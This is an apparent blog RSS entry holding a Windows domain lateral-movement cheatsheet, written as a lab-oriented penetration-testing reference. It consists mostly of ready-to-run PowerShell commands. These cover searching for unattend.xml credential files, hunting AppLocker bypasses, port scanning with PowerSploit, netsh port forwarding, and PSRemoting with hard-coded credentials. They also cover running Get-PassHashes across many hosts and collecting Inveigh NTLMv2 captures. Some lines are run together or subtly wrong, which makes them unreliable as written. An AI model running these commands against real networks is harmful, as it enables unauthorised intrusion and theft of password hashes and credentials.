<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Lateral Movement | Giovanni Pecoraro</title><link>https://www.peco602.com/tag/lateral-movement/</link><atom:link href="https://www.peco602.com/tag/lateral-movement/index.xml" rel="self" type="application/rss+xml"/><description>Lateral Movement</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Sun, 24 Jul 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Lateral Movement</title><link>https://www.peco602.com/tag/lateral-movement/</link></image><item><title>Domain Lateral Movement Cheatsheet</title><link>https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/</link><pubDate>Sun, 24 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/</guid><description>&lt;h2 id="local-files">Local Files&lt;/h2>
&lt;p>Find local senstive files on computers:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ChildItem&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*.&lt;/span>&lt;span class="n">xml&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-RecurseGet-ChildItem&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">unattend&lt;/span>&lt;span class="p">*.&lt;/span>&lt;span class="n">xml&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="applocker">AppLocker&lt;/h2>
&lt;p>Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at &lt;a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS&lt;/a> if only signed binaries are allowed:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-AppLockerPolicy&lt;/span> &lt;span class="n">-Effective&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">RuleCollections&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="port-scanning">Port Scanning&lt;/h2>
&lt;p>Check machine reachability:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Test-NetConnection&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="mf">3389&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Perform a port scanning:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerSploit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Open and filtered ports&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- FILTERED ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">filteredPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- FILTERED ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">filteredPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Only open ports&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901,5985&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## In place of host array it is possible to use a subnet (e.g. 192.168.1.0/24)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="port-forwarding">Port forwarding&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Forward a port to another host/port&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">sh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="n">v4tov4&lt;/span> &lt;span class="n">listenport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">80&lt;/span> &lt;span class="n">listenaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span> &lt;span class="n">connectport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">5985&lt;/span> &lt;span class="n">connectaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Note. Use IP addresses and not FQDNs not to trigger Kerberos auth&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-Item&lt;/span> &lt;span class="n">wsman&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Client&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">TrustedHosts&lt;/span> &lt;span class="n">-value&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$securePassword&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">-force&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$credential&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Management&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Automation&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">PsCredential&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$securePassword&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="mf">80&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$securePassword&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show all forwardings&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">show&lt;/span> &lt;span class="n">all&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Delete all forwardings&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">reset&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Delete a specific forwardingnet&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sh&lt;/span> &lt;span class="n">interface&lt;/span> &lt;span class="n">portproxy&lt;/span> &lt;span class="n">delete&lt;/span> &lt;span class="n">v4tov4&lt;/span> &lt;span class="n">listenport&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">80&lt;/span> &lt;span class="n">listenaddress&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">9&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="psremoting">PSRemoting&lt;/h2>
&lt;p>&lt;em>Requires ‘HTTP’ and ‘WSMAN’ SPNs&lt;/em>&lt;/p>
&lt;p>Enable PSRemoting on local machine and adds exception to the firewall:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enable-PSRemoting&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Create a PSSession:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enter a PSSession:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$sess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute commands or scriptblocks:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nb">Get-Process&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">hostname&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute commands with alternative credentials without prompt (useful to solve the double-hop problem):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$securePassword&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">-Force&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$credential&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Management&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Automation&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">PsCredential&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;cyberlab\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$securePassword&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">hostname&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$credential&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or to start a new session:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="nv">$credentialInvoke&lt;/span>&lt;span class="n">-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute scripts from files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-FilePath&lt;/span> &lt;span class="s2">&amp;#34;C:\scripts\Get-PassHashes.ps1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use below to execute locally loaded function on the remote machines:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">${&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">Get-PassHashes&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">${&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">Get-PassHashes&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Content&lt;/span> &lt;span class="s2">&amp;#34;.\list_of_computers.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-ArgumentList&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute “Stateful” commands using Invoke-Command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$Sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$Proc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">GetProcess&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Invoke-Command&lt;/span> &lt;span class="n">-Session&lt;/span> &lt;span class="nv">$Sess&lt;/span> &lt;span class="n">-ScriptBlock&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$Proc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Copy files between PSRemoting sessions:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Sess&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-PSSession&lt;/span> &lt;span class="n">-Computername&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Copy-Item&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="nb">Inveigh-NTLMv2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="n">-Destination&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user01&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-FromSession&lt;/span> &lt;span class="nv">$sess&lt;/span>
